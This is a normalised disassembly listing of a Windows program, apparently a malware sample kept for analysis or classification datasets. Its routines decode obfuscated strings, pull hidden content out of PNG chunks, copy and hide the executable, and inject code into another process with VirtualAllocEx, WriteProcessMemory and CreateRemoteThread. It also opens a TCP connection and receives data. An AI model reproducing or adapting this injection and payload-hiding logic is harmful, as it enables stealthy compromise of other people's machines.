stosw [ edi ]
stosb [ edi ]
xor eax eax
mov [ ebp + 0x5c ] bl
lea edi [ ebp + 0x5d ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x7f
xor edi edi
lea eax [ ebp - 0x37 ]
push ebx
inc edi
push eax
mov [ ebp - 0x204 ] edi
mov [ ebp - 0x1ec ] ebx
mov [ ebp - 0x38 ] bl
call sub_4046e0
lea eax [ ebp + 0x5c ]
push eax
lea eax [ ebp + 0x48 ]
push eax
lea eax [ esi + 0x48 ]
push eax
lea eax [ esi + 0x378 ]
push eax
call [ ebp - 0x224 ]
add esp 0x1c
push 0x2
pop eax
mov [ ebp - 0x48 ] ax
lea eax [ ebp + 0x48 ]
push eax
call [ ebp - 0x218 ]
cmp eax 0xf
jg r-xdata
lea eax [ ebp + 0x48 ]
push eax
call [ ebp - 0x220 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp + 0x5c ]
push eax
call [ ebp - 0x1e4 ]
pop ecx
test eax eax
jle r-xdata
lea eax [ ebp + 0x5c ]
push eax
call [ ebp - 0x1e4 ]
cmp eax 0xffff
pop ecx
jge r-xdata
lea eax [ ebp + 0x5c ]
push eax
call [ ebp - 0x1e4 ]
pop ecx
push eax
call [ ebp - 0x228 ]
mov [ ebp - 0x46 ] ax
lea eax [ ebp - 0x1d8 ]
push eax
push 0x202
call [ ebp - 0x230 ]
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push 0x6
push edi
push 0x2
call [ ebp - 0x238 ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push 0x10
lea eax [ ebp - 0x48 ]
push eax
push edi
call [ ebp - 0x23c ]
cmp eax 0xffffffff
je r-xdata
push eax
call [ ebp - 0x1e8 ]
push 0x2
push edi
call [ ebp - 0x208 ]
push edi
call [ ebp - 0x1e8 ]
call [ ebp - 0x1f0 ]
push [ ebp - 0x1e0 ]
add esi 0x6a0
call [ esi ]
push [ ebp - 0x1dc ]
call [ esi ]
push [ ebp - 0x210 ]
call [ esi ]
lea eax [ ebp - 0x204 ]
push eax
push 0x8004667e
push edi
call [ ebp - 0x1f8 ]
cmp eax 0xffffffff
jne r-xdata
push ebx
push 0x14
lea eax [ esi + 0x14 ]
push eax
push edi
call [ ebp - 0x20c ]
cmp eax 0xffffffff
je r-xdata
push edi
call [ ebp - 0x1e8 ]
xor ebx ebx
inc ebx
jmp r-xdata
push 0x80
lea eax [ ebp - 0x38 ]
push eax
mov [ ebp - 0x33c ] edi
mov [ ebp - 0x340 ] 0x1
call [ ebp - 0x234 ]
push ebx
push ebx
push ebx
lea eax [ ebp - 0x340 ]
push eax
push ebx
call [ ebp - 0x214 ]
cmp eax 0xffffffff
je r-xdata
call [ ebp - 0x1f0 ]
mov eax ebx
jmp r-xdata
lea eax [ ebp - 0x340 ]
push eax
push edi
call [ ebp - 0x22c ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ec ] ebx
je r-xdata
push ebx
push 0x7f
lea eax [ ebp - 0x38 ]
push eax
push edi
call [ ebp - 0x21c ]
cmp eax 0xffffffff
je r-xdata
push 0x10
lea eax [ esi + 0x14 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call [ ebp - 0x1fc ]
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0xcde ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call [ ebp - 0x1f4 ]
test eax eax
jne r-xdata
lea eax [ esi + 0xcee ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call [ ebp - 0x1f4 ]
test eax eax
jne r-xdata
push edi
push esi
call [ ebp - 0x200 ]
jmp r-xdata
mov [ ebp - 0x1ec ] 0x1
sub_4036a7
mov eax [ esp + 0x4 ]
mov cl [ eax ]
mov dl cl
shl dl 0x3
shr cl 0x5
push esi
or dl cl
xor dl [ esp + 0xc ]
xor esi esi
inc esi
mov [ eax ] dl
cmp [ esp + 0x10 ] esi
jbe r-xdata
pop esi
retn 0xc
mov cl [ esi + eax ]
mov dl cl
shl dl 0x3
shr cl 0x5
or dl cl
xor dl [ esi + eax - 0x1 ]
mov [ esi + eax ] dl
inc esi
cmp esi [ esp + 0x10 ]
jb r-xdata
sub_4036e6
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x4 ]
jmp r-xdata
dec ecx
jne r-xdata
mov al [ ecx + edx - 0x1 ]
xor al [ ecx + edx ]
ror al 0x3
mov [ ecx + edx ] al
mov al [ edx ]
xor al [ esp + 0x8 ]
mov cl al
shr cl 0x3
shl al 0x5
or cl al
mov [ edx ] cl
retn 0xc
sub_403715
push ebp
lea ebp [ esp - 0x218 ]
sub esp 0x298
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x214 ] eax
mov eax [ ebp + 0x224 ]
push ebx
push esi
mov esi [ ebp + 0x220 ]
push edi
mov [ ebp - 0x80 ] eax
mov eax [ ebp + 0x228 ]
mov edi 0x103
xor ebx ebx
push edi
mov [ ebp - 0x6c ] eax
lea eax [ ebp + 0xe1 ]
push ebx
push eax
mov [ ebp + 0xe0 ] bl
call sub_4046e0
push edi
lea eax [ ebp - 0x23 ]
push ebx
push eax
mov [ ebp - 0x24 ] bl
call sub_4046e0
xor eax eax
mov [ ebp - 0x48 ] bl
lea edi [ ebp - 0x47 ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
mov [ ebp + 0x1e4 ] bl
lea edi [ ebp + 0x1e5 ]
stosd [ edi ]
stosd [ edi ]
add esp 0x18
lea eax [ esi + 0x6e4 ]
push eax
mov [ ebp + 0x204 ] 0x7a
mov [ ebp + 0x205 ] 0x54
mov [ ebp + 0x206 ] 0x58
mov [ ebp + 0x207 ] 0x74
mov [ ebp + 0x208 ] bl
mov [ ebp + 0x1f8 ] 0x89
mov [ ebp + 0x1f9 ] 0x50
mov [ ebp + 0x1fa ] 0x4e
mov [ ebp + 0x1fb ] 0x47
mov [ ebp + 0x1fc ] 0xd
mov [ ebp + 0x1fd ] 0xa
mov [ ebp + 0x1fe ] 0x1a
mov [ ebp + 0x1ff ] 0xa
mov [ ebp + 0x200 ] bl
mov [ ebp + 0x20c ] 0x49
mov [ ebp + 0x20d ] 0x45
mov [ ebp + 0x20e ] 0x4e
mov [ ebp + 0x20f ] 0x44
mov [ ebp + 0x210 ] bl
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x5c ] ebx
call [ esi + 0x698 ]
mov [ ebp - 0x4c ] eax
cmp eax ebx
je r-xdata
xor eax eax
lea eax [ esi + 0x6d4 ]
push eax
call [ esi + 0x698 ]
test eax eax
je r-xdata
lea eax [ esi + 0x6a4 ]
push eax
call [ esi + 0x698 ]
mov edi eax
cmp edi ebx
je r-xdata
lea eax [ esi + 0xa4e ]
push eax
push [ ebp - 0x4c ]
call [ esi + 0x69c ]
mov [ ebp - 0x7c ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xc6e ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x60 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xc4e ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x74 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x7bc ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x54 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x800 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x28 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x7e4 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x78 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x7d8 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x40 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x880 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x38 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x7c8 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x64 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x80c ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x44 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xc7e ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x30 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x8a4 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x68 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x8c4 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x4c ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x77c ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x2c ] eax
cmp eax ebx
je r-xdata
push 0x3
lea eax [ esi + 0xd4 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call [ ebp - 0x60 ]
lea eax [ ebp + 0xe0 ]
push eax
push 0x1
lea eax [ ebp - 0x48 ]
push eax
add esi 0x1f8
push esi
call [ ebp - 0x38 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
push ebx
lea eax [ ebp - 0x48 ]
push eax
push esi
call [ ebp - 0x38 ]
test eax eax
je r-xdata
push ebx
push ebx
lea eax [ ebp + 0xe0 ]
push eax
push [ ebp - 0x6c ]
push ebx
call [ ebp - 0x7c ]
test eax eax
lea eax [ ebp + 0xe0 ]
jne r-xdata
push eax
call [ ebp - 0x28 ]
lea eax [ ebp - 0x24 ]
push ebx
mov edi 0x80
push edi
push 0x3
push ebx
push 0x1
push 0x80000000
push eax
call [ ebp - 0x54 ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
push ebx
push esi
call [ ebp - 0x64 ]
push ebx
push edi
push 0x3
push ebx
push 0x3
push 0xc0000000
lea eax [ ebp - 0x24 ]
push eax
call [ ebp - 0x54 ]
mov edi eax
mov [ ebp - 0x38 ] edi
cmp edi 0xffffffff
je r-xdata
push ebx
lea eax [ ebp - 0x34 ]
push eax
push 0x8
lea eax [ ebp + 0x1e4 ]
push eax
push esi
call [ ebp - 0x40 ]
test eax eax
jne r-xdata
lea eax [ ebp + 0x1f8 ]
push eax
lea eax [ ebp + 0x1e4 ]
push eax
mov [ ebp + 0x1ec ] bl
call [ ebp - 0x30 ]
test eax eax
jne r-xdata
push esi
call [ ebp - 0x2c ]
push edi
call [ ebp - 0x2c ]
lea eax [ ebp - 0x24 ]
push eax
call [ ebp - 0x28 ]
lea eax [ ebp + 0xe0 ]
jmp r-xdata
push ebx
push ebx
push 0x8
push eax
call [ ebp - 0x28 ]
mov edi [ ebp - 0x50 ]
push 0x1
push ebx
push ebx
push esi
call [ ebp - 0x44 ]
mov edi [ ebp - 0x3c ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x5c ] 0x1
jmp r-xdata
cmp [ ebp - 0x5c ] ebx
je r-xdata
mov eax [ ebp - 0x3c ]
push 0x1
push ebx
add eax 0x4
push eax
jmp r-xdata
lea eax [ ebp + 0x20c ]
push eax
lea eax [ ebp + 0x1f0 ]
push eax
call [ ebp - 0x30 ]
test eax eax
je r-xdata
push esi
call [ ebp - 0x2c ]
push [ ebp - 0x38 ]
call [ ebp - 0x2c ]
lea eax [ ebp + 0xe0 ]
push 0x1000
push 0x40
call [ ebp - 0x68 ]
mov [ ebp - 0x30 ] eax
cmp eax ebx
je r-xdata
push esi
call [ ebp - 0x44 ]
push ebx
lea eax [ ebp - 0x34 ]
push eax
push 0x4
lea eax [ ebp - 0x3c ]
push eax
push esi
call [ ebp - 0x40 ]
mov ecx [ ebp - 0x3c ]
movzx edx [ ebp - 0x3c ]
mov eax [ ebp - 0x3c ]
shr ecx 0x8
movzx ecx cl
shr eax 0x10
shl edx 0x8
or ecx edx
movzx edx al
shl ecx 0x8
shr eax 0x8
movzx eax al
or ecx edx
shl ecx 0x8
or ecx eax
push ebx
lea eax [ ebp - 0x34 ]
push eax
push 0x4
lea eax [ ebp + 0x1f0 ]
push eax
push esi
mov [ ebp - 0x3c ] ecx
call [ ebp - 0x40 ]
lea eax [ ebp + 0x204 ]
push eax
lea eax [ ebp + 0x1f0 ]
push eax
mov [ ebp + 0x1f4 ] bl
call [ ebp - 0x30 ]
test eax eax
jne r-xdata
push ebx
push ebx
push [ ebp - 0x58 ]
push esi
call [ ebp - 0x44 ]
cmp edi ebx
je r-xdata
push esi
call [ ebp - 0x2c ]
push [ ebp - 0x38 ]
call [ ebp - 0x2c ]
push [ ebp - 0x30 ]
call [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x80 ]
call [ ebp - 0x74 ]
lea eax [ ebp + 0xe0 ]
push eax
call [ ebp - 0x28 ]
xor eax eax
inc eax
jmp r-xdata
mov eax 0x1000
push ebx
cmp edi eax
jae r-xdata
mov ecx [ ebp + 0x214 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4045c5
add ebp 0x218
leave
retn 0xc
lea ecx [ ebp - 0x34 ]
push ecx
push eax
lea eax [ ebp - 0x34 ]
push eax
push edi
jmp r-xdata
call [ GetLastError@IAT ]
push esi
call [ ebp - 0x2c ]
push [ ebp - 0x38 ]
call [ ebp - 0x2c ]
lea eax [ ebp + 0xe0 ]
push eax
call [ ebp - 0x28 ]
lea eax [ ebp - 0x24 ]
push eax
call [ ebp - 0x28 ]
push [ ebp - 0x30 ]
call [ ebp - 0x4c ]
jmp r-xdata
cmp [ ebp - 0x34 ] ebx
je r-xdata
push [ ebp - 0x30 ]
push esi
call [ ebp - 0x40 ]
cmp eax ebx
je r-xdata
xor ecx ecx
cmp [ ebp - 0x34 ] ebx
jbe r-xdata
push ebx
lea eax [ ebp - 0x70 ]
push eax
push [ ebp - 0x34 ]
push [ ebp - 0x30 ]
push [ ebp - 0x38 ]
call [ ebp - 0x78 ]
sub edi [ ebp - 0x34 ]
jne r-xdata
mov eax [ ebp - 0x30 ]
add eax ecx
not [ eax ]
inc ecx
cmp ecx [ ebp - 0x34 ]
jb r-xdata
sub_403c6e
push ebp
lea ebp [ esp - 0xdc ]
sub esp 0x15c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xd8 ] eax
push ebx
push esi
push [ rw-data ]
call [ ReleaseMutex@IAT ]
xor ebx ebx
push 0x103
lea eax [ ebp - 0x2b ]
push ebx
push eax
mov [ ebp - 0x2c ] bl
call sub_4046e0
add esp 0xc
push rw-data
lea eax [ ebp - 0x2c ]
push eax
call [ lstrcpyA@IAT ]
lea eax [ ebp - 0x2c ]
push eax
call sub_405460
cmp [ ebp + eax - 0x2d ] 0x5c
mov esi [ lstrcatA@IAT ]
pop ecx
je r-xdata
push rw-data
lea eax [ ebp - 0x2c ]
push eax
call esi
mov esi rw-data
push esi
lea eax [ ebp - 0x2c ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
push rw-data
lea eax [ ebp - 0x2c ]
push eax
call esi
xor eax eax
push ebx
lea eax [ ebp - 0x2c ]
push eax
push esi
call [ CopyFileA@IAT ]
call sub_4017c3
push 0x44
pop esi
push esi
lea eax [ ebp - 0x80 ]
push ebx
push eax
call sub_4046e0
push 0x10
lea eax [ ebp - 0x3c ]
push ebx
push eax
mov [ ebp - 0x80 ] esi
call sub_4046e0
add esp 0x18
push eax
mov eax edx
add eax ecx
mov eax 0x1
sub eax 0x5
pop eax
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x80 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x2c ]
push eax
push ebx
call [ CreateProcessA@IAT ]
xor eax eax
inc eax
jmp r-xdata
mov ecx [ ebp + 0xd8 ]
pop esi
xor ecx ebp
pop ebx
call sub_4045c5
add ebp 0xdc
leave
retn
sub_403d74
push 0xc
push r--data
call sub_405254
xor edi edi
mov [ ebp - 0x4 ] edi
mov esi sub_401909
mov [ rw-data ] esi
mov [ rw-data ] sub_402370
mov [ rw-data ] sub_403192
mov [ rw-data ] sub_4036a7
mov [ rw-data ] sub_4036e6
mov [ rw-data ] sub_402ae3
mov [ rw-data ] sub_402a07
mov [ rw-data ] sub_402bd0
mov [ rw-data ] sub_403715
push 0x2000
call sub_4050ad
pop ecx
mov [ rw-data ] eax
lea eax [ ebp - 0x1c ]
push eax
push edi
push rw-data
push esi
push edi
push edi
call [ CreateThread@IAT ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_403e1e
call sub_405299
retn
sub_403e2b
push 0x30
push r--data
call sub_405254
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x4 ] edi
push 0x4
push 0x1000
push 0xd42
push edi
push [ ebp + 0x8 ]
mov esi [ VirtualAllocEx@IAT ]
call esi
mov [ ebp - 0x34 ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40403e
jmp sub_40403e
push 0x40
push 0x3000
push 0xf000
push edi
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x24 ] eax
cmp eax edi
je r-xdata
lea edi [ eax + 0x2000 ]
lea ebx [ edi + 0x2000 ]
lea ecx [ ebx + 0x2000 ]
mov [ ebp - 0x38 ] ecx
lea edx [ ecx + 0x2000 ]
mov [ ebp - 0x3c ] edx
lea eax [ edx + 0x2000 ]
mov [ ebp - 0x40 ] eax
lea esi [ eax + 0x1000 ]
mov [ ebp - 0x28 ] esi
add esi 0x1000
mov [ ebp - 0x2c ] esi
add esi 0x1000
mov [ ebp - 0x30 ] esi
mov esi [ ebp - 0x24 ]
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ebx
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax [ ebp - 0x28 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x2c ]
mov [ rw-data ] eax
mov eax [ ebp - 0x30 ]
mov [ rw-data ] eax
add eax 0x1000
mov [ rw-data ] eax
push ecx
and ecx 0x1
sub ecx 0x1
pop ecx
lea eax [ ebp - 0x1c ]
push eax
push 0xd42
push rw-data
push [ ebp - 0x34 ]
push [ ebp + 0x8 ]
mov esi [ WriteProcessMemory@IAT ]
call esi
test eax eax
je r-xdata
push 0x0
push 0x2000
push sub_401909
push [ ebp - 0x24 ]
push [ ebp + 0x8 ]
call esi
test eax eax
je r-xdata
push 0x0
push 0x2000
push sub_402370
push edi
push [ ebp + 0x8 ]
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov edi 0x2000
push edi
push sub_403192
push ebx
push [ ebp + 0x8 ]
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
push edi
push sub_4036a7
push [ ebp - 0x38 ]
push [ ebp + 0x8 ]
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
push edi
push sub_4036e6
push [ ebp - 0x3c ]
push [ ebp + 0x8 ]
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov edi 0x1000
push edi
push sub_402ae3
push [ ebp - 0x40 ]
push [ ebp + 0x8 ]
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
push edi
push sub_402a07
push [ ebp - 0x28 ]
push [ ebp + 0x8 ]
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
push edi
push sub_402bd0
push [ ebp - 0x2c ]
push [ ebp + 0x8 ]
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
push edi
push sub_403715
push [ ebp - 0x30 ]
push [ ebp + 0x8 ]
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
xor eax eax
push eax
push [ ebp - 0x34 ]
push [ ebp - 0x24 ]
push eax
push eax
push [ ebp + 0x8 ]
call [ CreateRemoteThread@IAT ]
sub_404066
push ebp
lea ebp [ esp - 0x194 ]
sub esp 0x214
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x190 ] eax
push ebx
push esi
push edi
mov esi 0x103
push esi
xor edi edi
lea eax [ ebp + 0x8d ]
push edi
push eax
mov [ ebp + 0x8c ] 0x0
call sub_4046e0
push esi
lea eax [ ebp - 0x77 ]
push edi
push eax
mov [ ebp - 0x78 ] 0x0
call sub_4046e0
add esp 0x18
lea ecx [ ebp - 0x80 ]
call sub_401605
lea ebx [ esi + 0x1 ]
push ebx
lea eax [ ebp + 0x8c ]
push eax
push edi
call [ GetModuleFileNameA@IAT ]
push ebx
lea eax [ ebp + 0x8c ]
push eax
push eax
call [ GetLongPathNameA@IAT ]
push 0xd42
push edi
mov esi rw-data
push esi
call sub_4046e0
add esp 0xc
push 0x10
mov edi rw-data
push edi
lea eax [ ebp + 0x8c ]
push eax
mov ecx esi
call sub_401001
push 0x1
push 0x10
push edi
push 0xd42
push esi
push esi
mov ecx rw-data
call sub_401540
mov ecx esi
call sub_401134
push 0x10
push edi
push rw-data
call sub_404a50
add esp 0xc
xor edi edi
push edi
call [ SetLastError@IAT ]
push esi
push 0x1
push edi
call [ CreateMutexA@IAT ]
mov [ rw-data ] eax
cmp eax edi
je r-xdata
lea ecx [ ebp - 0x80 ]
call sub_40160f
mov ecx [ ebp + 0x190 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_4045c5
add ebp 0x194
leave
retn 0x10
call [ GetLastError@IAT ]
cmp eax 0xb7
je r-xdata
lea eax [ ebp + 0x8c ]
push eax
push rw-data
call sub_4045e0
pop ecx
pop ecx
push 0x2
lea eax [ ebp + 0x8c ]
push eax
call [ SetFileAttributesA@IAT ]
lea eax [ ebp - 0x78 ]
push eax
push ebx
call [ GetTempPathA@IAT ]
push ebx
lea eax [ ebp - 0x78 ]
push eax
push eax
call [ GetLongPathNameA@IAT ]
lea eax [ ebp - 0x78 ]
push eax
push rw-data
call sub_4045e0
pop ecx
pop ecx
cmp [ rw-data ] edi
je r-xdata
call sub_403c6e
test eax eax
jne r-xdata
push 0x1
push r--data
lea ecx [ ebp - 0x80 ]
call sub_401699
lea ecx [ ebp - 0x80 ]
call sub_401676
call sub_403d74
push rw-data
lea ecx [ ebp - 0x80 ]
call sub_40171b
push 0x3e8
mov esi eax
call [ Sleep@IAT ]
cmp esi edi
jbe r-xdata
push esi
push edi
push 0x1fffff
call [ OpenProcess@IAT ]
mov esi eax
push esi
call sub_403e2b
push esi
call [ CloseHandle@IAT ]
jmp r-xdata
sub_404239
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_405ca6
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
or eax ebx
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_405974
push esi
mov ebx eax
call sub_405943
push esi
call sub_40432c
push eax
call sub_405876
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_404db5
pop ecx
mov [ esi + 0x1c ] edi
sub_4042b0
push 0xc
push r--data
call sub_405254
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_405ca6
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_405c3e
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_405dc6
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_404239
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404324
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_405299
retn
mov eax [ ebp - 0x1c ]
sub_40432c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
call sub_405ca6
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
sub_40435e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
and eax 0xffffffef
cmp [ ebp + 0x10 ] 0x1
mov [ esi + 0xc ] eax
jne r-xdata
call sub_405ca6
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
push esi
call sub_405974
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_406f9b
add [ ebp + 0xc ] eax
and [ ebp + 0x10 ] 0x0
pop ecx
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40432c
pop ecx
push eax
call sub_406c6b
xor ecx ecx
add esp 0xc
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
test al 0x8
je r-xdata
test eax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_4043e8
push 0xc
push r--data
call sub_405254
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi esi
je r-xdata
call sub_405ca6
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_405c3e
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_405dc6
pop ecx
mov [ ebp - 0x4 ] esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40435e
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404463
mov eax [ ebp - 0x1c ]
cmp edi 0x1
je r-xdata
call sub_405299
retn
cmp edi 0x2
jne r-xdata
sub_40446d
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_405ca6
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_407265
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_405ea4
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_4044ea
push 0xc
push r--data
call sub_405254
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi ebx
setne al
cmp eax ebx
je r-xdata
call sub_405ca6
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_405c3e
add esp 0x14
xor eax eax
cmp [ esi ] bl
setne al
cmp eax ebx
je r-xdata
call sub_405299
retn
call sub_4080c6
mov [ ebp + 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ edi ] bl
jne r-xdata
call sub_405ca6
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push esi
push edi
call sub_407dfd
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4045a4
mov eax [ ebp - 0x1c ]
call sub_405ca6
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_408200
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_4045e0
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_4045f0
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
